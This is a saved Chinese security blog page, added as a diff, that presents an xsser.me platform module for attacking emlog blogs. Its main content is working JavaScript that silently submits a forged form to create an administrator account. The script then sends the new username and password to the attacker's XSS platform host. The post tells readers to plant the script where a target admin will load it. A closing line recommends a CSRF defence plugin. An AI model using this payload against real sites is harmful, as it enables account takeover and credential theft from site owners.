@@ -1,0 +1,247 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>emlog全版本CSRF加用户xsser.me模块 | 离别歌</title>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/styles.css" rel="stylesheet"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/style.css" rel="stylesheet"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./emlog全版本CSRF加用户xsser.me模块  离别歌/jquery.min.js"></script>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/code.css" rel="stylesheet"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/button.css" rel="stylesheet"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./emlog全版本CSRF加用户xsser.me模块  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;text=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;title=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;is_video=false&amp;description=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;title=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;title=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;title=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;title=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/xsserme-emlog-csrf-module.html&amp;name=emlog%E5%85%A8%E7%89%88%E6%9C%ACCSRF%E5%8A%A0%E7%94%A8%E6%88%B7xsser.me%E6%A8%A1%E5%9D%97&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">emlog全版本CSRF加用户xsser.me模块</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年2月18日 15:50" itemprop="datePublished">
+                    2014 二月 18 15:50
+                </time>
+</div>
+<div class="article-tag">
+            阅读：9186
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/xsser.me">xsser.me</a>,
+                
+                <a class="tag-link" href="/tag/CSRF%E6%BC%8F%E6%B4%9E">CSRF漏洞</a>,
+                
+                <a class="tag-link" href="/tag/emlog">emlog</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+<span style="font-size:14px;">    前几天写了那个CSRF防御模块，官网回应较少，看来那里鲜有人把安全放在眼中。。今天干脆封装一个CSRF的模块，加入xsser.me这个平台里，方便以后的渗透。如果你的目标或目标的旁站中存在emlog，那么拿下来的几率还是很大的。</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">xsser.me模块代码：</span>
+<pre class="brush: js;auto-links: false;">var gum=function(){var u={version:"1140213",domain:"{{domain}}",backinfo:{}};return u.e=function(code){try{return eval(code)}catch(e){return""}},u.jquery=function(){return u.e("$().jquery")?1:0},u.id=function(e){return u.jquery()?$("#"+e):document.getElementById(e)},u.name=function(e){return document.getElementsByTagName(e)},u.html=function(){return u.name("html")[0]||document.write("&lt;html&gt;")||u.name("html")[0]},u.rdm=function(){return Math.random()*1e5},u.bind=function(e,t,n){u.jquery()?$(e).bind(t,n):e.addEventListener?e.addEventListener(t,n,!1):e.attachEvent("on"+t,n)},u.kill=function(e){u.jquery()?$(e).remove():e.parentElement.removeChild(e)},u.addom=function(e,t,n,r){!t&amp;&amp;(t=u.html());var i=document.createElement("span");i.innerHTML=e;var s=i.children[0];return n&amp;&amp;(s.style.display="none"),r&amp;&amp;u.bind(s,"load",r),t.appendChild(s),s},u.script=function(e,t){u.jquery()?$.getScript(e,t):(document.documentElement.appendChild(scripts=document.createElement("script")).src=e,t&amp;&amp;u.bind(scripts,"load",t),u.kill(scripts))},u.ajax=function(e,t,n){var r;return t?types="POST":types="GET",u.jquery()?(r=$.ajax({type:types,url:e,data:t,success:n}),r):(window.XMLHttpRequest?r=new XMLHttpRequest:r=new ActiveXObject("Microsoft.XMLHTTP"),r.open(types,e,!1),types=="POST"&amp;&amp;r.setRequestHeader("content-type","application/x-www-form-urlencoded"),n&amp;&amp;(r.onreadystatechange=function(){this.readyState==4&amp;&amp;(this.status&gt;=200&amp;&amp;this.status&lt;=300||this.status==304)&amp;&amp;n.apply(this,arguments)}),r.send(t),r)},u.post=function(e,t,n,r){var i=u.addom("&lt;form method='POST'&gt;",u.html(),!0);i.action=e;for(var s in t){var o=document.createElement("input");o.name=s,o.value=t[s],i.appendChild(o)}if(!n){var a=u.addom("&lt;iframe name=_"+u.rdm()+"_&gt;",u.html(),!0);i.target=a.name}r&amp;&amp;u.bind(i,"submit",r),i.submit(),!n&amp;&amp;u.kill(i)&amp;setTimeout(function(){u.kill(a)},3e3)},u}();(function(){var e="{set.user}",t="{set.pass}";gum.post(unescape("{set.target}")+"/admin/user.php?action=new",{login:e,password:t,password2:t,role:"admin"},!1),function(){(new Image).src="http://这里是你的xss平台地址/index.php?do=api&amp;id={projectId}&amp;username="+e+"&amp;password="+t}()})()</pre>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">修改其中xsser.me平台的地址即可。</span><br>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">在模块处新建模块，如下填写：</span>
+</br></p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201402/f9961392710111.jpg" id="ematt:464" target="_blank"><img alt="03.jpg" border="0" height="593" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/thum-f9961392710111.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">增加项目时，需要配置三个参数。填写你待添加的用户名、密码，还有你目标地址：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201402/4efd1392710109.jpg" id="ematt:462" target="_blank"><img alt="01.jpg" border="0" height="504" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/4efd1392710109.jpg" title="点击查看原图" width="506"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;"></span><span style="font-size:14px;">项目创建好后将js任意插入某个页面，让目标管理员访问，即可简单为其增加一个账号：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201402/2de41392710114.jpg" id="ematt:466" target="_blank"><img alt="04.jpg" border="0" height="116" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/thum-2de41392710114.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;"></span><span style="font-size:14px;">因为ajax处理post请求的跨域问题，所以采用的是form动态提交的方式，没有返回值……不管是否成功增加账号都会发送一条结果到xsser.me平台项目中。</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201402/3fb51392710110.jpg" id="ematt:463" target="_blank"><img alt="02.jpg" border="0" height="239" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/3fb51392710110.jpg" title="点击查看原图" width="437"/></a><span style="font-size:14px;"></span>
+</p>
+<p>
+<span style="font-size:14px;">    所以如果你是emlog使用者，真的把安全当回事，就使用CSRF防御插件。</span>
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2392">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/56b6addc11fc89ccffdbff8f482a0e39.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.test404.com" target="_blank">Test</a>
+<time datetime="2016年7月26日 13:59" itemprop="datePublished">
+                            2016 七月 26 13:59
+                        </time>
+<a href="javascript:reply_to('2392', 'Test')">回复</a>
+</p>
+<p class="comment-meta">表示后台从不默认.....最新版本官方已经修复了...看你的这几篇文章..幸好之前没用emlog...</p>
+</div>
+</div>
+<div class="row" id="comment-1901">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/a40e4f3dbf09fecb1b45df0a233f0978.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://weshell.net" target="_blank">温柔绕指尖</a>
+<time datetime="2014年12月22日 22:36" itemprop="datePublished">
+                            2014 十二月 22 22:36
+                        </time>
+<a href="javascript:reply_to('1901', '温柔绕指尖')">回复</a>
+</p>
+<p class="comment-meta">基本无视</p>
+</div>
+</div>
+<div class="row" id="comment-1547">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">趣购网</a>
+<time datetime="2014年2月18日 19:32" itemprop="datePublished">
+                            2014 二月 18 19:32
+                        </time>
+<a href="javascript:reply_to('1547', '趣购网')">回复</a>
+</p>
+<p class="comment-meta">写得很详细，很具体，很有用的文章</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="c76117fbc51c47dd1bd500630a85481b2fa34b7c"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./emlog全版本CSRF加用户xsser.me模块  离别歌/c76117fbc51c47dd1bd500630a85481b2fa34b7c"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="307">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="VZ3lYALlfVoQGcBhIZ2LsPK5vurx7ndMtjoRM4XAGIifGRZwwgwv1tMaEyUFQR2W"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./emlog全版本CSRF加用户xsser.me模块  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./emlog全版本CSRF加用户xsser.me模块  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
